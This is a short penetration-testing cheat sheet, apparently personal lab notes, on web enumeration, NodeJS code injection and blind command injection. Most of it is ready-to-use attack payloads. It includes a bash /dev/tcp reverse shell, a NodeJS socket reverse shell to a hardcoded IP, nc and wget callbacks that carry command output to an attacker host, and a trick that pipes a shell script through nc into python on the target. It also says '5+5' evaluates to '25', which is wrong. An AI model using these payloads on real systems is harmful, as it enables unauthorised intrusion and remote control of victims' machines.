# Misc


Always remember to searchsploit the name of whatever web-framework or CMS framework the website uses.


## Registration on websites

Often, we will be registering a new user on whatever site we are enumerating.
Consider running a registration from Burp so we can investigate the registration web traffic.

And always check your cookies after you have logged in.
Sometimes this will tell you how the site is managing admins from normal users.


## NodeJS and javascript injection

For simple NodeJS applications, remember to check if you can inject javascript to be run on the backend of the application.
If this isn't blind, you can do something like inputting `5+5` in the input parameter, and see if you extract the result `25`.
If this is the case, try to get a reverse shell with this:

```
require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0>%261"')
```


or:

```
(function(){
 var net = require(“net”),
 cp = require(“child_process”),
 sh = cp.spawn(“/bin/bash”, []);
 var client = new net.Socket();
 client.connect(21, “192.168.49.248”, function(){
 client.pipe(sh.stdin);
 sh.stdout.pipe(client);
 sh.stderr.pipe(client);
 });
 return /a/;
})();
```


## Gaining sight from blind command injection attacks

Tricks for verifying that a command actually goes through when doing blind command injection.
You can try:

```
wget ${ATTACKER_IP}
```
if that hits your IP, you are good.

You can also get a result from the command you run with e.g.:


```
echo whoami | nc ${ATTACKER_IP} ${ATTACKER_PORT}
```
And you should get the result on your nc listener on the port.
Note that this can also be used for checking bad special characters.


## exposing reverse shells with nc

Assume we have a linux box vulnerable to a command injection attack through a web server or something along those lines.
We can expose a reverse shell in the following way, if we so choose.

we pick a shell, e.g. python and place the python script in shell.py, and point it to `$ATTACKER_IP` and port 443.

Now on the attack box we run:


```
nc -nvlp 8080 < shell.py
```

and another listener on

```
nc -nvlp 443
```

Now, if we inject the command:
```
nc $ATTACKER_IP 8080 | python
```

We get a shell on the last listener we opened.
This can help us avoid having to send special characters over the wire to the target boxes.

